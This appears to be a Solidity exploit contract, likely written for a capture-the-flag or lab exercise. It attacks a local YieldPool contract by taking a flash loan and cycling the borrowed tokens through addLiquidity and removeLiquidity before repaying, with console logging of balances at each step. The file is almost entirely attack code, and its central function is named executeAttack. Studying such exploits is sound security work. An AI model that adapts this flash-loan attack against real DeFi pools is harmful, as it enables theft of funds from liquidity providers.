// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashLender.sol";
import "forge-std/console.sol";
import {YieldPool} from "./YieldPool.sol";
import {IERC20, ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/utils/Strings.sol";

contract FlashLoanReceiver is IERC3156FlashBorrower {
    YieldPool yieldPool;
    address public constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    constructor() payable {}
    /**
     * @dev Receive a flash loan.
     * @param initiator The initiator of the loan.
     * @param token The loan currency.
     * @param amount The amount of tokens lent.
     * @param fee The additional amount of tokens to repay.
     * @param data Arbitrary data structure, intended to contain user-defined parameters.
     * @return The keccak256 hash of "IERC3156FlashBorrower.onFlashLoan"
     */

    function onFlashLoan(address initiator, address token, uint256 amount, uint256 fee, bytes calldata data)
        external
        returns (bytes32)
    {
        uint256 amountWithFee = amount + amount / 100;
        ERC20 tokenContract = ERC20(token);

        tokenContract.approve(address(yieldPool), amount);
        // yieldPool.tokenToEth(100 ether);

        tokenContract.approve(address(yieldPool), amount);
        console.log("_------");
        console.log(
            "Before adding liquidity contract ",
            logData(address(this).balance),
            "eth",
            logData(tokenContract.balanceOf(address(this)))
        );
        console.log(
            "Before adding liquidity pool ",
            logData(address(yieldPool).balance),
            "Eth",
            logData(tokenContract.balanceOf(address(yieldPool)))
        );
        yieldPool.addLiquidity(0);
        // console.log("333", tokenContract.allowance(address(this), address(yieldPool)));
        // console.log("333", tokenContract.allowance(address(yieldPool), address(this)));
        console.log(
            "Before removing liquidity contract ",
            logData(address(this).balance),
            "eth",
            logData(tokenContract.balanceOf(address(this)))
        );
        console.log(
            "Before adding liquidity pool ",
            logData(address(yieldPool).balance),
            "Eth",
            logData(tokenContract.balanceOf(address(yieldPool)))
        );
        yieldPool.removeLiquidity(amountWithFee - amount);

        // yieldPool.addLiquidity(1000 ether);
        // yieldPool.ethToToken{value: 1000 ether}();
        console.log(
            "After removing liquidity contract ",
            logData(address(this).balance),
            "eth",
            logData(tokenContract.balanceOf(address(this)))
        );
        console.log(
            "After removing liquidity pool ",
            logData(address(yieldPool).balance),
            "Eth",
            logData(tokenContract.balanceOf(address(yieldPool)))
        );

        console.log(amountWithFee - tokenContract.balanceOf(address(this)));
        // yieldPool.ethToToken{value:}();
        console.log("amountWithFee", amountWithFee);
        //repay the loan depending on the token
        if (token == ETH) {
            (bool success,) = payable(msg.sender).call{value: amountWithFee}("");
        } else {
            tokenContract.transfer(address(yieldPool), amountWithFee);
        }

        console.log("Final balance", tokenContract.balanceOf(address(yieldPool)), address(yieldPool).balance);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function executeAttack(address payable _yieldPool, address _token, uint256 _amount, bytes calldata _data)
        external
        payable
    {
        yieldPool = YieldPool(_yieldPool);

        ERC20 tokenContract = ERC20(_token);
        console.log(
            "before ethToToken contract ",
            logData(address(this).balance),
            "eth",
            logData(tokenContract.balanceOf(address(this)))
        );
        yieldPool.ethToToken{value: address(this).balance / 2}();

        console.log(
            "After ethToToken contract ",
            logData(address(this).balance),
            "eth",
            logData(tokenContract.balanceOf(address(this)))
        );
        yieldPool.flashLoan(
            this,
            address(_token), // ETH,
            _amount - msg.value,
            // abi.encodeWithSelector(flashLoanReceiver.execute.selector)
            _data
        );
    }
    // function executeAtt
    //     yieldPool.flashLoan(
    //         adderss(this),
    //         address(token),
    //         // ETH,
    //         1000 ether,
    //         // abi.encodeWithSelector(flashLoanReceiver.execute.selector)
    //         ""
    //     );
    // }

    function logData(uint256 weiAmount) public returns (string memory) {
        // Calculate whole and fractional parts
        uint256 whole = weiAmount / 1e18;
        uint256 fractional = weiAmount % 1e18;

        return string.concat(string.concat(Strings.toString(whole), "."), Strings.toString(fractional));
    }

    receive() external payable {
        // console.log("Inside receive");
    }

    fallback() external payable {
        // console.log("Inside fallback");
        // The fallback function can have the "payable" modifier
        // which means it can accept ether.
        // revert();
    }
}
